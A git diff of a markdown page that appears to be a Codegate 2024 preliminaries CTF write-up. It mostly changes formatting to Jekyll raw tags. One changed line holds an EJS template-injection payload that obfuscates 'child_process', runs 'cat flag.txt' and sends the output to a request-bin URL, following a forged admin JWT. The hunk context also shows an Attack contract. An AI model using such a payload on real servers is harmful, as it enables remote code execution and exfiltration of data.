@@ -1,14 +1,14 @@
 ---
 layout: default
-title: codegate 2024 preliminaries
+title: "codegate 2024 preliminaries"
 nav_order: 2
 parent: 2024
 grand_parent: CTF
 has_children: false
 last_modified_date: 2024-06-14
 ---
---- 
 
+{% raw %}
 <br>
 if there is no flag on problem, that problem is solved after CTF.
 # misc
@@ -985,7 +985,7 @@ admin_jwt = jwt.encode(admin_origin, password, algorithm="HS256")
 s.cookies.clear()
 s.cookies.set("token", admin_jwt)
 
-payload = "settings[view options][escapeFunction]=(() => {import(`chi${''}ld_p${''}rocess`).then((xx) => {% raw %}{{var a = xx[`ex${''}ecSync`]('cat flag.txt');import(`https`).then((yy) => {yy.get(`[your_request_bin_url]?a=${a}`);});}}{% endraw %});})&settings[view options][client]=1&settings[view options][debug]=1"
+payload = "settings[view options][escapeFunction]=(() => {import(`chi${''}ld_p${''}rocess`).then((xx) => {{var a = xx[`ex${''}ecSync`]('cat flag.txt');import(`https`).then((yy) => {yy.get(`[your_request_bin_url]?a=${a}`);});}});})&settings[view options][client]=1&settings[view options][debug]=1"
 rce = s.get("http://localhost:3000/user-details/admin1?" + payload)
 ```
 
@@ -1215,3 +1215,4 @@ contract Attack is Script{
   }
 }
 ```
+{% endraw %}
